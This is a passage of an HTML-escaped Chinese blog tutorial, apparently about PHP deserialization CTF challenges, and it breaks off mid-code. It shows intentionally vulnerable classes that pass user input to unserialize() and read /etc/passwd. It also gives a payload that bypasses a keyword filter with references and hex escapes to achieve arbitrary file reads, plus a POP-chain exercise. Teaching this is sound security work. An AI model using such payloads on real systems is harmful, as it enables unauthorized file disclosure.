class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;name = &lt;span class=&#34;string&#34;&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;user&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;user = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;user&amp;#x27;&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;input&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$input&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;input&amp;#x27;&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;stristr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$input&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;user&amp;#x27;&lt;/span&gt;)!==False)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Hacker&amp;#x27;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$input&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;像如上代码比较复杂的可以先定位魔术方法与漏洞触发点。在代码中发现__toString () 魔术方法调用了 file_get_contents () 来读取变量name的数据。当程序执行结束或者变量销毁时就会自动调用析构函数__destruct()并使用echo输出变量，__toString()方法在此时会被自动调用。关键在于如果能控制变量 name，就可以造成任意文件读取漏洞。但是通读代码发现前端传入的可控数据只有变量&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mtext&gt;，并且传入的&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;user，并且传入的&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;并&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;且&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;传&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;入&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; user 还不能包含 “user” 子符串。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;paload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class MyFile &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $name = &amp;#x27;/etc/hosts&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $user = &amp;#x27;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a = new MyFile();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a-&amp;gt;name = &amp;amp;$a-&amp;gt;user;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$b = serialize($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$b = str_replace(&amp;quot;user&amp;quot;, &amp;quot;use\\72&amp;quot;, $b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$b = str_replace(&amp;quot;s&amp;quot;, &amp;quot;S&amp;quot;, $b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var_dump($b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//通过浅拷贝绕过 if(stristr($this-&amp;gt;name, &amp;quot;flag&amp;quot;)!==False) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//通过十六进制绕过if(stristr($input, &amp;#x27;user&amp;#x27;)!==False)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一般 POP 链都是反着程序来生成，将我们要实现的代码序列化，传入程序进行反序列化 ，就可以让程序按照我们的想法执行。&lt;/p&gt;
&lt;h4 id=&#34;0x08&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x08&#34;&gt;#&lt;/a&gt; 0x08&lt;/h4&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;start_gg&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;test1&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Call&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test1&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;test2&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;funct&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__call&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$test2&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$s1&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$s1&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;func&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$mod2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__invoke&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod2 = &lt;span class=&#34;string&#34;&gt;&amp;quot;字符串拼接&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;mod1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;string1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$str1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$str2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;str1-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;get_flag&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;GetFlag&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;get_flag&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;flag:xxxxxxxxxxxx&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;string&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span 